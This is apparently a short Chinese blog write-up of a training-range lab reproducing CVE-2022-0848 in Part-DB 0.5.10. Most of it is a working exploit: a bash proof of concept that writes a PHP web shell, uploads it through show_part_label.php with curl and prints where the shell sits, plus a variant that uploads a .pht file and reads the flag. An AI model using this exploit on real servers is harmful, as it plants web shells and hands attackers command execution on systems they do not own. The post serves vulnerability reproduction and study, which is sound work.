---
title: CVE-2022-0848【RCE】
author: Ghost
date: 2023-12-10
categories:
  - ['春秋云境', '漏洞靶标']
  - 漏洞复现
tags:
  - 'RCE'
---

## 1. 漏洞介绍

[OS Command Injection vulnerability found in part-db](https://huntr.com/bounties/3e91685f-cfb9-4ee4-abaf-9b712a8fd5a6/)

## 2. 漏洞复现

**Proof of Concept**

```bash
#!/bin/bash

host=127.0.0.1/Part-DB-0.5.10 #WEBHOST

echo "<?php system(id); ?>">POC.phtml  #PHP Shell Code

result=`curl -i -s -X POST -F "logo_file=@POC.phtml" "http://$host/show_part_label.php" | grep -o -P '(?<=value="data/media/labels/).*(?=" > <p)'`

rm POC.phtml

echo Shell Location : "$host/data/media/labels/$result"
```

经测试，可上传pht格式的文件，修改 POC 读取flag `system('cat /flag');`

```bash
 curl -i -s -X POST -F "logo_file=@poc.pht" "http://eci-2ze02k3jkii0av79ezzb.cloudeci1.ichunqiu.com/show_part_label.php" | grep -o -P "(?<=value='data/media/labels/).*(?=' > <p)"
```


![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310201138115.png)
